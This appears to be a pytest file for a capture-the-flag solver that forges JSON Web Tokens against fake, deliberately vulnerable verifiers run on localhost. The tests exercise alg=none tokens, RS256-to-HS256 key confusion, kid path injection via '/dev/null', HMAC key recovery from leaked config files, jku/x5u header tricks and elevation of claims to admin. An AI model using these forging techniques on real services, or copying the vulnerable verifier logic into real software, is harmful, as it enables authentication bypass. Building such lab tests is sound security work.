#!/usr/bin/env python3
"""Tests for the B-019 live JWT forge engine (solvers/web/jwt_forge_live.py).

Pure forge/harvest helpers are tested offline and directly. The live sweep is tested against fake
JWT apps started on 127.0.0.1 (the suite pins a loopback scope profile in tests/conftest.py); no real
network, no challenge binary. Each fake app is a deliberately vulnerable JWT verifier built in-test.
"""
from __future__ import annotations

import base64
import datetime as _dt
import hashlib
import hmac
import importlib.util
import json
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "solvers" / "toolkits"))  # the WebClient's flat-owner folder


def _load_engine():
    spec = importlib.util.spec_from_file_location(
        "jwt_forge_live", REPO / "solvers" / "web" / "jwt_forge_live.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


JF = _load_engine()


# ---- a minimal event profile with a known flag format -------------------------------------------
def _profile():
    from ctf import event
    return event.parse({
        "slug": "jwt-forge-test", "name": "jwt forge test",
        "dates": {"start": _dt.date(2026, 1, 1), "end": _dt.date(2026, 12, 31)},
        "platform": {"kind": "ctfd", "base_url": "https://board.suite-platform.test"},
        "flag": {"prefixes": ["CSCTF"]},
        "rules": {"submit_mode": "manual", "flag_sharing": "forbidden", "ai_on_platform": "allowed",
                  "live_service_scope": ["127.0.0.0/8", "localhost"]},
    }, src="tests/test_web_jwt_forge_live.py")


FLAG = "CSCTF{forged_jwt_is_mine}"


def _b64u(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _ub64(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


# ==================================================================================================
#  pure helpers
# ==================================================================================================
def test_codec_roundtrip_and_decode():
    header = {"alg": "HS256", "typ": "JWT", "kid": "k1"}
    payload = {"user": "bob", "role": "analyst"}
    tok = JF.sign_hs(header, payload, b"topsecret")
    h, p, si, sig = JF.decode_jwt(tok)
    assert h["alg"] == "HS256" and h["kid"] == "k1"
    assert p == payload
    assert JF.verify_hs(si, sig, "HS256", b"topsecret")
    assert not JF.verify_hs(si, sig, "HS256", b"wrong")


def test_decode_jwt_rejects_malformed():
    with pytest.raises(JF.JwtForgeError):
        JF.decode_jwt("only.two")
    with pytest.raises(JF.JwtForgeError):
        JF.decode_jwt(_b64u(b"not json") + "." + _b64u(b"{}") + ".")


def test_find_jwt():
    tok = JF.sign_hs({"alg": "HS256"}, {"a": 1}, b"k")
    assert JF.find_jwt(f"session={tok}; Path=/") == tok
    assert JF.find_jwt("no token here") is None


def test_sign_hs_matches_reference():
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"sub": "x"}
    tok = JF.sign_hs(header, payload, b"abc")
    h_seg, p_seg, s_seg = tok.split(".")
    want = hmac.new(b"abc", f"{h_seg}.{p_seg}".encode(), hashlib.sha256).digest()
    assert _ub64(s_seg) == want
    # forging overrides whatever alg the caller passed in the header dict.
    tok2 = JF.sign_hs({"alg": "RS256"}, payload, b"abc", "HS256")
    assert json.loads(_ub64(tok2.split(".")[0]))["alg"] == "HS256"


def test_forge_none_has_empty_signature():
    tok = JF.forge_none({"alg": "HS256"}, {"role": "admin"}, "none")
    assert tok.endswith(".")
    assert json.loads(_ub64(tok.split(".")[0]))["alg"] == "none"


def test_recover_hmac_key_finds_and_rejects():
    header, payload = {"alg": "HS256"}, {"u": 1}
    tok = JF.sign_hs(header, payload, b"the-real-key")
    _, _, si, sig = JF.decode_jwt(tok)
    got = JF.recover_hmac_key(si, sig, "HS256", [b"nope", b"the-real-key", b"late"])
    assert got == b"the-real-key"
    assert JF.recover_hmac_key(si, sig, "HS256", [b"nope", b"also-no"]) is None
    # a non-HMAC alg can never be recovered this way.
    assert JF.recover_hmac_key(si, sig, "RS256", [b"the-real-key"]) is None


def test_harvest_includes_raw_word_and_sha256():
    asset = b"# config\nSIGNING_SECRET = hunter2hunter2\n"
    cands = JF.harvest_key_candidates([asset])
    assert asset in cands                       # raw blob
    assert b"hunter2hunter2" in cands           # printable word
    assert hashlib.sha256(asset).digest() in cands
    assert b"secret" in cands                   # a common secret is always offered
    # a key hidden as a bare word in an asset is recoverable end to end.
    tok = JF.sign_hs({"alg": "HS256"}, {"r": "analyst"}, b"hunter2hunter2")
    _, _, si, sig = JF.decode_jwt(tok)
    assert JF.recover_hmac_key(si, sig, "HS256", cands) == b"hunter2hunter2"


def test_harvest_is_deduplicated_and_capped():
    cands = JF.harvest_key_candidates([b"x" * 10] * 50)
    assert len(cands) == len(set(cands))
    assert len(cands) <= JF.MAX_KEY_CANDIDATES


def test_elevate_claims():
    out = JF.elevate_claims({"role": "analyst", "exp": 1, "is_admin": False})
    assert out["role"] == "admin"
    assert out["is_admin"] is True
    assert out["exp"] > 1_000_000
    # a payload with no obvious role still gets an admin role added.
    assert JF.elevate_claims({"sub": "x"})["role"] == "admin"
    # a list-of-roles claim is elevated too.
    assert JF.elevate_claims({"roles": ["analyst"]})["roles"] == ["admin"]


def test_elevate_claims_refreshes_temporal_validity():
    # A token issued long ago with stale exp/iat/nbf would be rejected by any verifier that checks
    # temporal claims; elevate_claims must refresh all three so the forged token is valid *now*.
    now = 1_700_000_000
    stale = {"role": "analyst", "exp": 1, "iat": 2, "nbf": 3}
    out = JF.elevate_claims(stale, now=now)
    assert out["exp"] == now + 3600          # pushed into the future
    assert out["iat"] == now - 5             # refreshed to ~now
    assert out["nbf"] == now - 5             # refreshed to ~now (not left in the past/future)
    # temporal claims that were absent are not invented.
    out2 = JF.elevate_claims({"role": "analyst"}, now=now)
    assert "iat" not in out2 and "nbf" not in out2 and "exp" not in out2


def test_rs256_to_hs256_uses_pubkey_as_secret():
    # leading + trailing whitespace, so raw / strip / nl are three distinct byte keys.
    pub = b"  -----BEGIN PUBLIC KEY-----\nMFkw...\n-----END PUBLIC KEY-----\n"
    variant_key = {"rs256->hs256:raw": pub, "rs256->hs256:strip": pub.strip(),
                   "rs256->hs256:nl": pub.strip() + b"\n"}
    toks = dict(JF.rs256_to_hs256_tokens({"alg": "RS256"}, {"role": "admin"}, [pub]))
    assert set(toks) == set(variant_key)
    for label, tok in toks.items():
        _, _, si, sig = JF.decode_jwt(tok)
        assert json.loads(_ub64(tok.split(".")[0]))["alg"] == "HS256"
        # each variant verifies under exactly its own byte spelling of the public key.
        assert JF.verify_hs(si, sig, "HS256", variant_key[label])


def test_kid_injection_tokens():
    assets = {"/public/logo.png": b"\x89PNG\r\n..."}
    toks = dict(JF.kid_injection_tokens({"alg": "HS256"}, {"role": "admin"}, assets))
    assert "kid=/dev/null" in toks
    # /dev/null uses an empty key.
    _, _, si, sig = JF.decode_jwt(toks["kid=/dev/null"])
    assert JF.verify_hs(si, sig, "HS256", b"")
    # an asset-referencing kid signs with the asset bytes.
    asset_tok = next(t for lbl, t in JF.kid_injection_tokens(
        {"alg": "HS256"}, {"role": "admin"}, assets) if lbl.startswith("kid=") and "null" not in lbl)
    _, _, si2, sig2 = JF.decode_jwt(asset_tok)
    assert JF.verify_hs(si2, sig2, "HS256", assets["/public/logo.png"])


def test_discover_paths():
    body = (b'<link href="/static/app.css"><img src="/public/logo.png">'
            b'<a href="/.well-known/jwks.json">keys</a> see /public/key.pem')
    paths = JF.discover_paths(body)
    assert "/static/app.css" in paths
    assert "/public/logo.png" in paths
    assert "/.well-known/jwks.json" in paths
    assert "/public/key.pem" in paths


def test_jwks_public_blobs():
    jwks = json.dumps({"keys": [{"kty": "RSA", "n": _b64u(b"modulus-bytes"), "e": "AQAB"}]}).encode()
    blobs = JF.jwks_public_blobs(jwks)
    assert _b64u(b"modulus-bytes").encode() in blobs
    assert b"modulus-bytes" in blobs
    assert JF.jwks_public_blobs(b"not json") == []


def test_jku_x5u_tokens_offline():
    pytest.importorskip("cryptography")
    header, payload = {"alg": "RS256"}, {"role": "admin"}
    attempts, published = JF.jku_x5u_tokens(
        header, payload, jku_url="http://127.0.0.1/jwks.json", x5u_url="http://127.0.0.1/c.pem")
    labels = [lbl for lbl, _ in attempts]
    assert any(lbl.startswith("jku=") for lbl in labels)
    assert any(lbl.startswith("x5u=") for lbl in labels)
    assert "keys" in json.loads(published["jwks"])
    assert published["kid"] and "BEGIN PUBLIC KEY" in published["public_pem"]


# ==================================================================================================
#  a configurable fake JWT app (local, 127.0.0.1) + the live sweep
# ==================================================================================================
class JwtApp:
    """A deliberately vulnerable JWT verifier for the sweep to attack. Modes:
      hs_weak   : HS256 verified with a secret that leaks in /public/config.txt
      confusion : RS256 app whose verifier also accepts HS256 under the PEM bytes
      alg_none  : accepts alg=none
      kid       : HS256 and reads the signing key from the file named by `kid`
    """
    def __init__(self, mode):
        self.mode = mode
        self.secret = b"leaky-hmac-secret-xyz"
        self.assets = {"/public/config.txt": b"# app config\nJWT_SECRET = leaky-hmac-secret-xyz\n",
                       "/public/logo.png": b"\x89PNG\r\nLOGOBYTES-known-to-attacker"}
        self.cookie = "session"
        self._issued = self._make_issued()
        if mode == "confusion":
            self._setup_rsa()

    # -- token helpers --
    def _make_issued(self):
        header = {"alg": "none" if self.mode == "alg_none" else "HS256", "typ": "JWT", "kid": "app"}
        payload = {"user": "analyst-1", "role": "analyst"}
        if self.mode == "alg_none":
            return JF.forge_none(header, payload, "none")
        if self.mode == "kid":
            # issued token's kid names a server-side key file the attacker doesn't know.
            header["kid"] = "/etc/app/secret.key"
            return JF.sign_hs(header, payload, b"server-private-unknown")
        return JF.sign_hs(header, payload, self.secret)

    def _setup_rsa(self):
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        self._priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        self.pub_pem = self._priv.public_key().public_bytes(
            serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
        # issued token is a genuine RS256 token.
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import padding
        h = {"alg": "RS256", "typ": "JWT", "kid": "app"}
        p = {"user": "analyst-1", "role": "analyst"}
        si = f"{JF._encode_segment(h)}.{JF._encode_segment(p)}".encode()
        sig = self._priv.sign(si, padding.PKCS1v15(), hashes.SHA256())
        self._issued = f"{si.decode()}.{JF.b64u_encode(sig)}"

    # -- verification the attacker is trying to defeat --
    def _is_admin(self, token):
        try:
            header, payload, si, sig = JF.decode_jwt(token)
        except Exception:
            return False
        alg = header.get("alg")
        verified = False
        if self.mode == "alg_none":
            verified = alg in ("none", "None", "NONE")
        elif self.mode == "hs_weak":
            verified = alg == "HS256" and hmac.compare_digest(
                hmac.new(self.secret, si, hashlib.sha256).digest(), sig)
        elif self.mode == "kid":
            kid = header.get("kid", "")
            # vulnerable: fetch "key bytes" from the path in kid (maps public assets + /dev/null).
            keymap = {p: data for p, data in self.assets.items()}
            keymap["/dev/null"] = b""
            # normalize a traversal spelling back to a known asset.
            norm = "/" + kid.lstrip("./").lstrip("/")
            for known in list(keymap):
                if norm.endswith(known.lstrip("/")):
                    norm = known
                    break
            key = keymap.get(norm)
            if key is None and kid == "/dev/null":
                key = b""
            verified = (alg == "HS256" and key is not None
                        and hmac.compare_digest(hmac.new(key, si, hashlib.sha256).digest(), sig))
        elif self.mode == "confusion":
            if alg == "HS256":
                # the confusion bug: HS256 verified with the RSA *public key* bytes as the secret.
                verified = hmac.compare_digest(
                    hmac.new(self.pub_pem, si, hashlib.sha256).digest(), sig)
            elif alg == "RS256":
                from cryptography.hazmat.primitives import hashes
                from cryptography.hazmat.primitives.asymmetric import padding
                try:
                    self._priv.public_key().verify(sig, si, padding.PKCS1v15(), hashes.SHA256())
                    verified = True
                except Exception:
                    verified = False
        role = payload.get("role")
        return verified and role == "admin"

    def handle(self, method, path, headers):
        if path == "/token":
            body = json.dumps({"token": self._issued}).encode()
            return 200, "application/json", body, {"Set-Cookie": f"{self.cookie}={self._issued}; Path=/"}
        if path in self.assets:
            return 200, "application/octet-stream", self.assets[path], {}
        if path == "/.well-known/kestrel-id.pem" and self.mode == "confusion":
            return 200, "application/x-pem-file", self.pub_pem, {}
        if path == "/":
            links = b'<a href="/public/config.txt">cfg</a><img src="/public/logo.png">'
            if self.mode == "confusion":
                links += b'<a href="/.well-known/kestrel-id.pem">pub</a>'
            return 200, "text/html", b"<html>" + links + b"</html>", {}
        if path in ("/admin/flag", "/admin"):
            token = None
            auth = headers.get("Authorization", "")
            if auth.startswith("Bearer "):
                token = auth[7:]
            cookie = headers.get("Cookie", "")
            if not token and "=" in cookie:
                token = cookie.split("=", 1)[1]
            if token and self._is_admin(token):
                return 200, "text/plain", f"welcome admin: {FLAG}".encode(), {}
            return 401, "text/plain", b"unauthorized", {}
        return 404, "text/plain", b"not found", {}


def _serve(app):
    class H(BaseHTTPRequestHandler):
        def _go(self):
            st, ctype, body, extra = app.handle(self.command, self.path, dict(self.headers))
            data = body if isinstance(body, (bytes, bytearray)) else body.encode()
            self.send_response(st)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(data)))
            for k, v in extra.items():
                self.send_header(k, v)
            self.end_headers()
            try:
                self.wfile.write(data)
            except Exception:
                pass

        do_GET = do_POST = _go

        def log_message(self, *a):
            pass

    srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, f"http://127.0.0.1:{srv.server_address[1]}/"


def _run(mode, **opts):
    app = JwtApp(mode)
    srv, url = _serve(app)
    try:
        return JF.solve(Path("."), _profile(), target=url, **opts)
    finally:
        srv.shutdown()


def test_live_hs256_key_recovery():
    res = _run("hs_weak")
    assert res.status == "solved", res.notes
    assert FLAG in res.flags
    assert res.evidence


def test_live_rs256_to_hs256_confusion():
    pytest.importorskip("cryptography")
    res = _run("confusion")
    assert res.status == "solved", res.notes
    assert FLAG in res.flags


def test_live_alg_none():
    res = _run("alg_none")
    assert res.status == "solved", res.notes
    assert FLAG in res.flags


def test_live_kid_injection():
    res = _run("kid")
    assert res.status == "solved", res.notes
    assert FLAG in res.flags


def test_forge_send_does_not_inherit_a_recon_cookie():
    # The send-path guard (WebClient.clear_cookies before each forged request) must stop a cookie
    # collected while probing from carrying into the next forged-token request. This app is NOT
    # forgeable (strong HS256 secret, absent from every asset) but hands back an admin-granting
    # Set-Cookie on every /admin probe. If that cookie leaked across sends, the sweep would report a
    # bogus "solved" with no valid forge; the guard keeps the result honest at "none".
    class CookieLeak(JwtApp):
        def __init__(self, mode):
            super().__init__(mode)
            self.secret = hashlib.sha512(b"strong-secret-not-in-any-asset").digest()
            self._issued = JF.sign_hs({"alg": "HS256", "typ": "JWT"},
                                      {"user": "analyst-1", "role": "analyst"}, self.secret)

        def handle(self, method, path, headers):
            if path in ("/admin/flag", "/admin"):
                cookie = headers.get("Cookie", "")
                if "admin_sess=granted" in cookie:  # the leak the guard must prevent
                    return 200, "text/plain", f"welcome admin: {FLAG}".encode(), {}
                # every probe hands back the admin session cookie.
                return 401, "text/plain", b"unauthorized", {"Set-Cookie": "admin_sess=granted; Path=/"}
            return super().handle(method, path, headers)

    app = CookieLeak("hs_weak")
    srv, url = _serve(app)
    try:
        res = JF.solve(Path("."), _profile(), target=url, transport="bearer", max_requests=60)
    finally:
        srv.shutdown()
    assert res.status == "none", res.notes
    assert not res.flags


def test_live_no_flag_is_none():
    # a non-vulnerable app: HS256 with a strong secret not present in any asset.
    app = JwtApp("hs_weak")
    app.secret = hashlib.sha512(b"unguessable-not-in-assets").digest()
    app._issued = JF.sign_hs({"alg": "HS256", "typ": "JWT"}, {"role": "analyst"}, app.secret)
    srv, url = _serve(app)
    try:
        res = JF.solve(Path("."), _profile(), target=url, max_requests=60)
    finally:
        srv.shutdown()
    assert res.status == "none", res.notes
    assert not res.flags


def test_blocked_without_target():
    res = JF.solve(Path("."), _profile(), target=None)
    assert res.status == "blocked"
    assert "target" in res.notes.lower()


def test_blocked_unreachable_target():
    # a closed loopback port: in scope but nothing listens -> the sweep reaches nothing.
    res = JF.solve(Path("."), _profile(), target="http://127.0.0.1:1/", max_requests=10)
    assert res.status == "blocked", res.notes


def test_unsure_when_no_token():
    # an app that serves pages but issues no JWT anywhere.
    class Empty(JwtApp):
        def handle(self, method, path, headers):
            if path == "/":
                return 200, "text/html", b"<html>no tokens here</html>", {}
            return 404, "text/plain", b"nf", {}

    app = Empty("hs_weak")
    srv, url = _serve(app)
    try:
        res = JF.solve(Path("."), _profile(), target=url, recon_paths=["/"], max_requests=10)
    finally:
        srv.shutdown()
    assert res.status == "unsure", res.notes


def test_result_json_roundtrips():
    res = _run("hs_weak")
    from ctf.result import SolverResult
    assert SolverResult.from_json(res.to_json()).flags == res.flags


if __name__ == "__main__":
    sys.exit(pytest.main([__file__, "-q"]))
